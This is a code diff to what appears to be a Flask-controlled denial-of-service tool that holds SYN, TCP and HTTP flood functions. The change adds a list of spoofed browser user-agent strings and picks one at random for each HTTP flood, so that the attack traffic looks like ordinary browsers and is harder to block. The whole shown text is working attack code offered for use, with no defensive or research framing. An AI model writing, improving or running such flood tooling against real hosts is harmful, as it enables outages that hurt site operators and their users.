@@ -3,8 +3,18 @@ import socket
 import threading
 import time
 import requests
+import random
 
 app = Flask(__name__)
+
+# List of user agents to simulate different browsers and devices
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
+]
 
 def syn_flood(target_ip, target_port, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -49,10 +59,13 @@ def tcp_flood(target_ip, target_port, duration):
         sock.send(b'A' * 1024)
 
 def http_flood(target_url, duration):
+    headers = {
+        'User-Agent': random.choice(user_agents)
+    }
     end_time = time.time() + duration
     while time.time() < end_time:
         try:
-            requests.get(target_url)
+            requests.get(target_url, headers=headers)
         except requests.exceptions.RequestException:
             pass
 
